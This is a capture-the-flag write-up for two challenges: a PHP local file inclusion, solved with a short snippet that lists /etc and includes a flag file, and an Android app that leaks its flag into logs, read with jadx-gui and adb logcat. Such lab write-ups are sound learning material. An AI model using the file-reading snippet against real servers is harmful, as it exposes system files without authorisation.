This post has writeup for two challenges: `WTF PHP (Web)` and `ezpz (Android app reversing)` 

## 1. WTF php

This challenge has the local file inclusion (LFI) vulnerability. The solution is as follows:
1. Use opendir() and readdir() to list the contents of /etc directory.
2. Get the name of the txt file containing the flag (f1@g.txt).
3. Use the include directive to read the file. The code is as follows
```php
<?php
	include '/etc/f1@g.txt';	
	$filelist = array();
	if ($handle = opendir("/etc")) {
    	while ($entry = readdir($handle)) {
          	$filelist[] = $entry;
    	}
	print_r($filelist);
    closedir($handle);
	}
?>
```

## 2. ezpz

In this challenge, the app exposes the flag, i.e, sensitive information in the logs. Here's how I got the flag:

1. I used jadx-gui to read the source code of the ezpz.apk file.
2. In the source code of main activity, you can see that the method isThisWhatUWant() is called (line 33).


3. Now when you go to the code of this function, it takes a snapshot of a firebase collection and prints the flag in the logs of the app.
4. So to get the flag, all you have to do is setup an emulator (like Genymotion), install the app on the emulator, run it and get the logs using the command 'adb logcat'.


